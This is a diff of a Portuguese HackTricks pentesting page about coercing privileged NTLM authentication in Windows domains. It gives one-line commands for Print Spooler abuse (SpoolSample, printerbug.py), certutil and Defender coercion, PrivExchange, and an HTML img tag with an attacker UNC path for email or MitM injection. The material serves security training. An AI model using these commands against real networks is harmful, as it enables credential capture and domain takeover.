@@ -1,57 +1,60 @@
 # Forçar Autenticação Privilegiada NTLM
 
+{% hint style="success" %}
+Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Aprenda hacking AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-* Você trabalha em uma **empresa de cibersegurança**? Quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
-* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
-* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Compartilhe seus truques de hacking enviando PRs para o [repositório hacktricks](https://github.com/carlospolop/hacktricks) e [repositório hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.
+* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
+* **Junte-se ao** 💬 [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Compartilhe truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.
 
 </details>
+{% endhint %}
 
 ## SharpSystemTriggers
 
 [**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) é uma **coleção** de **gatilhos de autenticação remota** codificados em C# usando o compilador MIDL para evitar dependências de terceiros.
 
-## Abuso do Serviço Spooler
+## Abuso do Serviço de Spooler
 
-Se o serviço _**Print Spooler**_ estiver **habilitado**, você pode usar algumas credenciais AD já conhecidas para **solicitar** ao servidor de impressão do Controlador de Domínio uma **atualização** sobre novos trabalhos de impressão e simplesmente dizer para **enviar a notificação para algum sistema**.\
-Observe que quando a impressora envia a notificação para sistemas arbitrários, ela precisa se **autenticar contra** esse **sistema**. Portanto, um atacante pode fazer com que o serviço _**Print Spooler**_ se autentique contra um sistema arbitrário, e o serviço **usará a conta do computador** nessa autenticação.
+Se o _**Serviço de Spooler de Impressão**_ estiver **ativado**, você pode usar algumas credenciais AD já conhecidas para **solicitar** ao servidor de impressão do Controlador de Domínio uma **atualização** sobre novos trabalhos de impressão e apenas dizer para **enviar a notificação para algum sistema**.\
+Observe que, quando a impressora envia a notificação para sistemas arbitrários, ela precisa **se autenticar contra** esse **sistema**. Portanto, um atacante pode fazer o _**Serviço de Spooler de Impressão**_ se autenticar contra um sistema arbitrário, e o serviço **usará a conta do computador** nessa autenticação.
 
 ### Encontrando Servidores Windows no domínio
 
-Usando o PowerShell, obtenha uma lista de máquinas Windows. Os servidores geralmente têm prioridade, então vamos focar neles:
+Usando PowerShell, obtenha uma lista de máquinas Windows. Servidores geralmente têm prioridade, então vamos focar lá:
 ```bash
 Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
 ```
-### Encontrando serviços Spooler ouvindo
+### Encontrando serviços de Spooler escutando
 
-Usando uma versão ligeiramente modificada do [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket) de @mysmartlogin (Vincent Le Toux), verifique se o Serviço Spooler está ouvindo:
+Usando uma versão ligeiramente modificada do @mysmartlogin (Vincent Le Toux) [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket), veja se o Serviço de Spooler está escutando:
 ```bash
 . .\Get-SpoolStatus.ps1
 ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
 ```
-Você também pode usar o rpcdump.py no Linux e procurar pelo Protocolo MS-RPRN.
+Você também pode usar rpcdump.py no Linux e procurar pelo Protocolo MS-RPRN
 ```bash
 rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
 ```
-### Solicitar que o serviço se autentique em um host arbitrário
+### Peça ao serviço para autenticar contra um host arbitrário
 
-Você pode compilar [**SpoolSample daqui**](https://github.com/NotMedic/NetNTLMtoSilverTicket)**.**
+Você pode compilar[ **SpoolSample daqui**](https://github.com/NotMedic/NetNTLMtoSilverTicket)**.**
 ```bash
 SpoolSample.exe <TARGET> <RESPONDERIP>
 ```
-ou use [**dementor.py** de 3xocyte](https://github.com/NotMedic/NetNTLMtoSilverTicket) ou [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) se estiver no Linux
+ou use [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) ou [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) se você estiver no Linux
 ```bash
 python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
 printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
 ```
-### Combinando com Delegação Não Restrita
+### Combinando com Delegação Inconstrangida
 
-Se um atacante já comprometeu um computador com [Delegação Não Restrita](unconstrained-delegation.md), o atacante poderia **fazer a impressora autenticar-se neste computador**. Devido à delegação não restrita, o **TGT** da **conta de computador da impressora** será **salvo na** **memória** do computador com delegação não restrita. Como o atacante já comprometeu este host, ele será capaz de **recuperar este ticket** e abusá-lo ([Pass the Ticket](pass-the-ticket.md)).
+Se um atacante já comprometeu um computador com [Delegação Inconstrangida](unconstrained-delegation.md), o atacante poderia **fazer a impressora se autenticar contra este computador**. Devido à delegação inconstrangida, o **TGT** da **conta de computador da impressora** será **salvo na** **memória** do computador com delegação inconstrangida. Como o atacante já comprometeu este host, ele será capaz de **recuperar este ticket** e abusar dele ([Pass the Ticket](pass-the-ticket.md)).
 
 ## Autenticação Forçada RCP
 
@@ -59,13 +62,13 @@ Se um atacante já comprometeu um computador com [Delegação Não Restrita](unc
 
 ## PrivExchange
 
-O ataque `PrivExchange` é resultado de uma falha encontrada na **funcionalidade de `PushSubscription` do Exchange Server**. Esta funcionalidade permite que o servidor Exchange seja forçado por qualquer usuário de domínio com uma caixa de correio a autenticar-se em qualquer host fornecido pelo cliente via HTTP.
+O ataque `PrivExchange` é resultado de uma falha encontrada na **funcionalidade `PushSubscription` do Exchange Server**. Esta funcionalidade permite que o servidor Exchange seja forçado por qualquer usuário de domínio com uma caixa de correio a se autenticar em qualquer host fornecido pelo cliente via HTTP.
 
-Por padrão, o **serviço Exchange é executado como SYSTEM** e possui privilégios excessivos (especificamente, possui **privilégios WriteDacl no domínio antes da Atualização Cumulativa de 2019**). Essa falha pode ser explorada para permitir o **encaminhamento de informações para o LDAP e, posteriormente, extrair o banco de dados NTDS do domínio**. Em casos onde o encaminhamento para o LDAP não é possível, essa falha ainda pode ser usada para encaminhar e autenticar-se em outros hosts dentro do domínio. A exploração bem-sucedida deste ataque concede acesso imediato ao Administrador de Domínio com qualquer conta de usuário de domínio autenticada.
+Por padrão, o **serviço Exchange é executado como SYSTEM** e recebe privilégios excessivos (especificamente, possui **privilégios WriteDacl na atualização cumulativa do domínio anterior a 2019**). Esta falha pode ser explorada para habilitar o **encaminhamento de informações para LDAP e, subsequentemente, extrair o banco de dados NTDS do domínio**. Em casos onde o encaminhamento para LDAP não é possível, esta falha ainda pode ser usada para encaminhar e autenticar em outros hosts dentro do domínio. A exploração bem-sucedida deste ataque concede acesso imediato ao Admin do Domínio com qualquer conta de usuário autenticada do domínio.
 
 ## Dentro do Windows
 
-Se você já estiver dentro da máquina Windows, você pode forçar o Windows a se conectar a um servidor usando contas privilegiadas com:
+Se você já estiver dentro da máquina Windows, pode forçar o Windows a se conectar a um servidor usando contas privilegiadas com:
 
 ### Defender MpCmdRun
 ```bash
@@ -79,25 +82,42 @@ Ou use esta outra técnica: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce
 
 ### Certutil
 
-É possível usar o lolbin certutil.exe (binário assinado pela Microsoft) para forçar a autenticação NTLM:
+É possível usar certutil.exe lolbin (binário assinado pela Microsoft) para forçar a autenticação NTLM:
 ```bash
 certutil.exe -syncwithWU  \\127.0.0.1\share
 ```
-## Injeção de HTML
+## HTML injection
 
 ### Via email
 
-Se você conhece o **endereço de e-mail** do usuário que faz login em uma máquina que deseja comprometer, você pode simplesmente enviar a ele um **e-mail com uma imagem 1x1** como:
+Se você souber o **endereço de e-mail** do usuário que faz login em uma máquina que você deseja comprometer, você pode simplesmente enviar a ele um **e-mail com uma imagem 1x1** como
 ```html
 <img src="\\10.10.17.231\test.ico" height="1" width="1" />
 ```
+e quando ele o abrir, ele tentará se autenticar.
+
 ### MitM
 
-Se você conseguir realizar um ataque MitM a um computador e injetar HTML em uma página que ele visualizar, você pode tentar injetar uma imagem como a seguinte na página:
+Se você puder realizar um ataque MitM a um computador e injetar HTML em uma página que ele visualizar, você pode tentar injetar uma imagem como a seguinte na página:
 ```html
 <img src="\\10.10.17.231\test.ico" height="1" width="1" />
 ```
-## Quebrando o NTLMv1
+## Quebrando NTLMv1
 
 Se você conseguir capturar [desafios NTLMv1 leia aqui como quebrá-los](../ntlm/#ntlmv1-attack).\
 _Lembre-se de que, para quebrar o NTLMv1, você precisa definir o desafio do Responder como "1122334455667788"_
+
+{% hint style="success" %}
+Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
+<details>
+
+<summary>Support HackTricks</summary>
+
+* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
+* **Junte-se ao** 💬 [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Compartilhe truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.
+
+</details>
+{% endhint %}
